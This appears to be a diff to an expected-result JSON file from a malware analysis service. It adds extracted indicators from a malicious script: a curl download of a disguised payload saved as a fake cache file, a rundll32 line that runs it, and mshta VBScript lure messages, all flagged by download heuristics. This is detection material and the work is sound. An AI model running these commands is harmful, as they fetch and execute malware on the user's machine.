@@ -112,6 +112,15 @@
           }
         },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "rundll32 C:\\Users\\puncher\\AppData\\Local\\temp\\windows.cache netflix",
+                "mshta vbscript:Execute(\"msgbox \"\"You may need to download and install Firefox Browser if not installed\"\":close\")",
+                "mshta vbscript:Execute(\"msgbox \"\"Firefox and addon links have been generated in this folder\"\":close\")"
+              ]
+            }
+          },
           "network": {
             "static": {
               "uri": [
@@ -186,6 +195,27 @@
           "heur_id": 5,
           "signatures": [],
           "value": "curl -s https://file.lucasvl.nl/f/T2VHb19/netflix.png -o C:\\Users\\puncher\\AppData\\Local\\temp\\windows.cache "
+        },
+        {
+          "heur_id": 10,
+          "signatures": [
+            "internet_download"
+          ],
+          "value": "mshta vbscript:Execute(\"msgbox \"\"Firefox and addon links have been generated in this folder\"\":close\")"
+        },
+        {
+          "heur_id": 10,
+          "signatures": [
+            "internet_download"
+          ],
+          "value": "mshta vbscript:Execute(\"msgbox \"\"You may need to download and install Firefox Browser if not installed\"\":close\")"
+        },
+        {
+          "heur_id": 10,
+          "signatures": [
+            "internet_download"
+          ],
+          "value": "rundll32 C:\\Users\\puncher\\AppData\\Local\\temp\\windows.cache netflix"
         }
       ],
       "network.static.uri": [
